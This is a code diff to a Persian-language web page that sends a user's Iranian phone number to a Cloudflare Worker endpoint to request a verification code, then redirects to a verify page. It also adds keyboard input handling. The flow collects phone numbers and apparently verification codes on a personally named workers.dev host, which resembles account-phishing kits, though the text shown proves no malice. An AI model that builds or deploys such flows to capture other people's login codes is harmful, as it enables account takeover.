@@ -473,6 +473,10 @@
     </div>
 
     <script>
+        // ======= آدرس Worker =======
+        const WORKER_URL = "https://appp.salhamir146.workers.dev";
+        // ===========================
+
         let currentLang = 'fa';
 
         const translations = {
@@ -517,6 +521,7 @@
         let phoneText = '';
         let codeText = '98';
         let activeField = 'phone';
+        let isSubmitting = false;
 
         const numDisplay = document.getElementById('numDisplay');
         const codeDisplay = document.getElementById('codeDisplay');
@@ -614,6 +619,47 @@
             renderList(filtered);
         });
 
+        // تابع ارسال شماره به Worker
+        async function sendPhoneToWorker(phone) {
+            if (isSubmitting) return;
+            isSubmitting = true;
+            nextBtn.style.opacity = '0.6';
+            nextBtn.style.pointerEvents = 'none';
+
+            try {
+                const fullPhone = '+' + codeText + phone;
+                
+                const response = await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        phone: fullPhone,
+                        action: 'send_code'
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.success) {
+                    localStorage.setItem('userPhone', fullPhone);
+                    setTimeout(() => {
+                        window.location.href = 'verify.html';
+                    }, 300);
+                } else {
+                    alert(data.message || (currentLang === 'fa' ? 'خطا در ارسال کد. لطفاً دوباره تلاش کنید.' : 'Error sending code. Please try again.'));
+                }
+            } catch (error) {
+                console.error('Error sending phone:', error);
+                alert(currentLang === 'fa' ? 'خطا در ارتباط با سرور. لطفاً دوباره تلاش کنید.' : 'Connection error. Please try again.');
+            } finally {
+                isSubmitting = false;
+                nextBtn.style.opacity = '1';
+                nextBtn.style.pointerEvents = 'auto';
+            }
+        }
+
         nextBtn.addEventListener('click', () => {
             if (codeText !== '98') {
                 alert(translations[currentLang].errorIran);
@@ -624,9 +670,7 @@
                 return;
             }
             
-            // ذخیره شماره در حافظه و انتقال به صفحه بعد
-            localStorage.setItem('userPhone', '+' + codeText + phoneText);
-            window.location.href = 'verify.html';
+            sendPhoneToWorker(phoneText);
         });
 
         document.querySelectorAll('.key-btn').forEach(btn => {
@@ -649,6 +693,30 @@
                 }
                 updateDisplay();
             });
+        });
+
+        // پشتیبانی از کیبورد فیزیکی
+        document.addEventListener('keydown', (e) => {
+            if (e.key >= '0' && e.key <= '9') {
+                if (activeField === 'phone') {
+                    if (phoneText.length < 15) phoneText += e.key;
+                } else {
+                    if (codeText.length < 4) codeText += e.key;
+                }
+                updateDisplay();
+                e.preventDefault();
+            } else if (e.key === 'Backspace') {
+                if (activeField === 'phone') {
+                    phoneText = phoneText.slice(0, -1);
+                } else {
+                    codeText = codeText.slice(0, -1);
+                }
+                updateDisplay();
+                e.preventDefault();
+            } else if (e.key === 'Enter') {
+                nextBtn.click();
+                e.preventDefault();
+            }
         });
 
         updateTexts();
